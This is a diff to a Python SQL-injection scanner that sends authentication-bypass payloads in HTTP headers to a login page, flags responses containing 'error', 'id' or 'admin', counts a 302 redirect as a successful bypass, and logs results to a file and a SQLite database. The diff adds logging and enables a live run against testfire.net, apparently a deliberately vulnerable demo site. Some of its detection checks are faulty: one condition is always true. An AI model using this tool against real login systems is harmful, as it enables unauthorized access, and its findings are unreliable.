@@ -8,6 +8,7 @@ from datetime import datetime
 import sqlite3
 # from database import create_database_for_Captures
 from headers import Prepare_the_headers,headers,header
+import logging
 
 
 ############################################################################
@@ -27,6 +28,8 @@ https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the
 """Tested against: http://testfire.net/login.jsp """
 
 
+
+
 ####################################33
 pattern = r"\berror\b"
 htmlpattern = r"\bid\b"
@@ -41,7 +44,7 @@ headers = {
 
 
 #
-
+logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 
 async def auth_SQL_inj_HEADER(urls):
@@ -66,6 +69,7 @@ async def auth_SQL_inj_HEADER(urls):
             # assert req.status_code == 200
             if req.status_code == 200: #* If the host is up we inform the user
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
+                logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")
 
                 if ask.lower() == "y": #* if y
                     for line in sorted_payload.split("\n"): #* Create a for loop in the program
@@ -89,33 +93,40 @@ async def auth_SQL_inj_HEADER(urls):
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: #* if the regex pattern founds we inform the user
                                 print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
+                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                 await asyncio.sleep(3) #* Stop the program for 5 sec
                             
                             if htmlVULN:
                                 print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
+                                logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
                                 await asyncio.sleep(3)
                             
-                            word = "id" in req.text #* inform the user the other results
+                            word = "id" in req.text                             #* inform the user the other results
                             errword = "error" in req.text
                             if word:
                                 print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
+                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                 await asyncio.sleep(3)
                             
                             if errword:
                                 print(f"[{datetime.now()}]",Fore.RED + "|**Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",header)
+                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                 await asyncio.sleep(3)
                                 
                             
                                 
-                        if req.status_code == 302: #*If could even break to the website we inform the user
+                        if req.status_code == 302:                                              #*If could even break to the website we inform the user
                             print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
+                            logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
                             done = True
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                             print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]**Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",headers)
+                            logging.info(f"Could not find any injectable significant area in the target:{urls} in the time:{datetime.now()}")
                             
                 else:
                     print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
+                    logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
             
         # await create_database_for_Captures()
         conn = sqlite3.connect("SQLJresult.db")
@@ -130,19 +141,6 @@ async def auth_SQL_inj_HEADER(urls):
         conn.commit()
         conn.close()
         #############################################################################################################
-        # capturesAUTHBYPASS.append(headers)
-        # capturesAUTHBYPASS.append(ack.status_code)
-        # capturesAUTHBYPASS.append(vuln)
-        # capturesAUTHBYPASS.append(htmlVULN)
-        # capturesAUTHBYPASS.append(errword)
-        # capturesAUTHBYPASS.append(word)
-        # capturesAUTHBYPASS.append(req.status_code)
-        # capturesAUTHBYPASS.append(ack)
-        
-                
-        # capturesAUTHBYPASS.append(str(htmlVULN))
-        # capturesAUTHBYPASS.append(str(vuln))         
-                    
     except Exception as e:
         print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
         
@@ -202,5 +200,5 @@ async def auth_SQL_inj_HEADER(urls):
 async def auth_main(urL):
     await auth_SQL_inj(urL)
 
-# asyncio.run(auth_SQL_inj_HEADER("http://testfire.net/login.jsp"))
+asyncio.run(auth_SQL_inj_HEADER("http://testfire.net/login.jsp"))
 # print(capturesAUTHBYPASS)
